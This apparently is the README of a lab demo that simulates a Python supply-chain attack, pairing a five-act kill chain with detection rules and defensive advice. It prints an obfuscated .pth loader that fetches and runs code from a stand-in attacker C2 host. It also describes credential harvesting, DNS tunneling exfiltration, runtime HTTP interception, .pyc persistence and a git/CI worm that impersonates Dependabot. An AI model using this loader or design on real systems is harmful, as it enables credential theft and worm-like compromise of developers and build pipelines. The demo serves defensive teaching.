# Pathogen: A Feature-Native Supply-Chain Kill Chain

**What happens when you compose only documented, intended behavior into a weapon?**

No CVEs. No kernel exploits. No zero-days. Just eight language features working exactly as designed.

---

## The Features

| Feature | Intended Use | Weaponized Use |
|:--|:--|:--|
| `.pth` files | Add directories to `sys.path` at startup | Execute arbitrary code on any Python invocation |
| `exec()` | Run dynamically generated code | Fetch and execute remote payload with zero disk footprint |
| `monkey-patching` | Test doubles, instrumentation | Silently intercept all HTTP traffic at runtime |
| `__pycache__` / `.pyc` | Cache compiled bytecode for faster startup | Persist malicious code that survives package uninstallation |
| `git push` | Collaborate on code | Propagate to every developer who pulls the repo |
| `npm postinstall` | Run setup scripts after `npm install` | Cross-ecosystem execution -- Python compromise triggers Node.js callback |
| DNS TXT queries | Service discovery, SPF/DKIM records | Covert data exfiltration channel that bypasses HTTP monitoring |
| CI/CD pipelines | Automated build/test/deploy | Automatic propagation through infrastructure, harvesting CI secrets |

---

## Act 1 -- Steal

A poisoned package `pyautoconf` is published to the internal PyPI registry. It contains a `.pth` file with a one-liner:

```python
import os;exec("\nimport urllib.request,sys\nif not os.environ.get('_PTH_GUARD'):\n    os.environ['_PTH_GUARD']='1'\n    _ns={'__builtins__':__builtins__};exec(urllib.request.urlopen(os.environ.get('C2_URL','http://attacker-c2:9000')+'/stage').read(),_ns)\n")
```

When any Python process starts, `site.py` processes this `.pth` file. The payload is fetched from C2 and executed in memory -- no files written, no import statement needed.

The first act harvests the developer's workstation:

- SSH keys and config (`~/.ssh/`)
- AWS / GCP / Azure credentials
- `.env` files (often containing API keys, database passwords)
- Docker and npm auth tokens
- Shell history (commands that may contain passwords or tokens)
- Git config (identity for impersonation)

---

## Act 2 -- Exfiltrate

Raw credentials are bundled into a tar.gz archive and encrypted with hybrid cryptography:

1. **AES-256-CBC** encrypts the archive with a random session key
2. **RSA-4096** wraps the session key so only the attacker's private key can decrypt it
3. The encrypted bundle is POSTed to C2

Even if the exfiltration is intercepted by a network monitor, the contents are unreadable without the RSA private key. The C2 server decrypts and previews every stolen file in real time on the dashboard.

### DNS Covert Channel

Immediately after the HTTP exfil, the payload opens a second exfiltration channel: DNS TXT queries. Environment variables are base64-encoded, split into ~50-byte chunks, and sent as subdomain labels:

```
0.a1b2c3d4.SGVsbG8gV29ybGQ.exfil.pathogen.local
1.a1b2c3d4.dGhpcyBpcyBhIH.exfil.pathogen.local
fin.a1b2c3d4.exfil.pathogen.local
```

The `dns-exfil` container listens on UDP 53, reassembles the chunks per session, and reports to the dashboard. No HTTP involved -- this channel would survive egress proxies that only inspect HTTP/HTTPS traffic.

---

## Act 3 -- Wiretap + Persist

### Runtime Interception

The payload monkey-patches `urllib.request.urlopen` and `requests.sessions.Session.request`. From that moment, every HTTP call the application makes is silently mirrored to the attacker's dashboard -- including internal API calls with auth headers.

This is not a proxy. It's a runtime hook injected into the process itself. The application's source code is never modified. No network configuration changes. Invisible to static analysis.

### Bytecode Persistence

The payload compiles a minimal Python script into a `.pyc` file and drops it under `~/.cache/pathogen/__pycache__/`. The compiled bytecode contains a beacon that phones home on execution.

The point: if a security team finds and removes the `pyautoconf` package, this bytecode artifact survives. It's not referenced by any installed package. It sits in a cache directory that most cleanup procedures don't touch.

---

## Act 4 -- Spread + Polyglot Escape

### Git Worm

Using the SSH keys stolen in Act 1, the payload clones an internal repository, appends `pyautoconf>=4.3.0` to `requirements.txt`, and pushes the change as a commit signed by "Dependabot".

When any other developer pulls the repo and runs `pip install -r requirements.txt`, the cycle repeats on their machine.

### Polyglot Escape

The same commit also poisons `package.json` with a `postinstall` script and drops `scripts/postinstall.js` -- a Node.js payload that calls the C2's `/polyglot` endpoint.

When a developer on the team runs `npm install`, the Node.js postinstall hook fires and phones home. The Python supply-chain compromise has now crossed into the Node.js ecosystem.

This is the "polyglot escape": one foothold, two package managers, two execution runtimes.

### CI/CD Pipeline Compromise

A third container, `ci-runner`, simulates a build agent (GitHub Actions or Jenkins). It polls the same internal git repo. When the poisoned `requirements.txt` arrives, the CI runner automatically:

1. Runs `pip install -r requirements.txt` from the internal registry
2. The `.pth` hook triggers during the install
3. CI-specific secrets are harvested: `GITHUB_TOKEN`, deploy keys, `DOCKER_REGISTRY_PASSWORD`, `AWS_ACCESS_KEY_ID` (CI role)

This is the most dangerous propagation path. A single developer's compromised SSH key leads to a poisoned repo, which leads to every build agent in the organization running the payload with elevated privileges and access to production deployment credentials.

---

## Act 5 -- Detect (Blue Team)

The `defender` container provides the blue team perspective. It subscribes to the same dashboard WebSocket as the UI and evaluates every event against 12 Sigma-style detection rules mapped to MITRE ATT&CK techniques:

| Rule | Technique | Fires On |
|:--|:--|:--|
| Malicious .pth File Deployed | T1546.016 | `.pth` moved to site-packages |
| Fileless Payload Served | T1059.006 | C2 serves Python payload |
| Credential Files Harvested | T1552.001 | SSH keys, .env, cloud creds read |
| Encrypted HTTP Exfiltration | T1041 | POST /exfil with encrypted bundle |
| DNS TXT Exfiltration | T1048.003 | Covert DNS channel completes |
| Runtime HTTP Hook | T1557 | urllib/requests monkey-patched |
| Bytecode Implant | T1547 | .pyc dropped to non-standard cache |
| Git Repo Poisoned | T1195.002 | Worm pushes to internal repo |
| Polyglot Callback | T1204.002 | npm postinstall phones home |
| Dependabot Masquerade | T1036.005 | Commit impersonates dependency bot |
| CI/CD Compromised | T1195.002 | Build agent infected |
| Implant Activated | T1547 | Persisted .pyc executes post-cleanup |

Detections fire with a configurable delay (default 0.8s) to simulate realistic SOC latency. The dashboard shows them in a dedicated red-bordered "Detections" pane alongside the attack timeline.

---

## What Makes This Effective

**Fileless delivery.** The `.pth` hook fetches and `exec()`s the payload in memory. There is no `pathogen_payload.py` sitting in site-packages for a file scanner to find.

**Invisible interception.** Monkey-patching stdlib functions leaves no trace in the application source. Static analysis, code review, and `git diff` all show a clean codebase.

**Resilient persistence.** Bytecode under `__pycache__` survives `pip uninstall`. Most incident response playbooks don't include "scan every `.pyc` file on the system."

**Trust-chain propagation.** The worm doesn't need PyPI access. It uses the developer's own SSH keys to push to repositories they already have write access to. The poisoned commit looks like a routine dependency update.

**Cross-ecosystem reach.** A single Python compromise propagates through both `pip` and `npm` lifecycle hooks, reaching developers who may not even use Python.

**Multi-channel exfiltration.** HTTP POST and DNS TXT queries provide redundant exfil paths. Blocking one doesn't stop the other.

**Infrastructure compromise.** The worm doesn't just spread to developer laptops -- it reaches CI/CD pipelines where the payload runs with deployment privileges and access to production secrets.

---

## Defensive Takeaways

1. **Treat `.pth` files as executable code, not metadata.** Scan wheel contents before promoting packages to internal indexes. Flag any `.pth` file that contains `import` or `exec`.

2. **Monitor startup execution paths.** Audit `site.py` behavior, `sys.meta_path` hooks, and unexpected entries in `site-packages/*.pth`.

3. **Include bytecode in incident cleanup.** When removing a suspected malicious package, also scan `__pycache__` directories and `~/.cache/` for orphaned `.pyc` files.

4. **Audit dependency lifecycle scripts.** Both `setup.py` / `pyproject.toml` and `package.json` `postinstall` hooks are execution surfaces. Review them on every dependency update.

5. **Rotate credentials after any supply-chain compromise.** SSH keys, API tokens, cloud credentials, and registry auth tokens should all be treated as potentially exfiltrated.

6. **Pin dependencies and use lockfiles.** `requirements.txt` without version pins is an open invitation. Use `pip-compile`, `poetry.lock`, or `package-lock.json`.

7. **Monitor DNS for data exfiltration.** High-entropy subdomain labels in TXT queries are a strong indicator of DNS tunneling. Alert on query patterns to unusual or newly-registered domains.

8. **Isolate CI/CD environments.** Build agents should have minimal, scoped credentials. Rotate CI secrets frequently. Monitor for unexpected network connections from build containers.

9. **Deploy runtime detection.** Monitor for `sys.meta_path` modifications, unexpected `.pth` files, and monkey-patching of stdlib functions in production Python processes.

---

## Running the Demo

```bash
make demo
# or: docker compose up --build
# open http://localhost:3000
# click Launch Attack
# watch all five acts unfold in real time
# click ATT&CK to see MITRE technique mapping
# after completion: Replay at 2x-10x, Download PCAP for Wireshark
make clean
# or: docker compose down -v
```

`demo.py` is the standalone litellm-specific educational simulation.  
The Docker flow is the broader "inspired by" story -- same mechanics, tighter narrative.
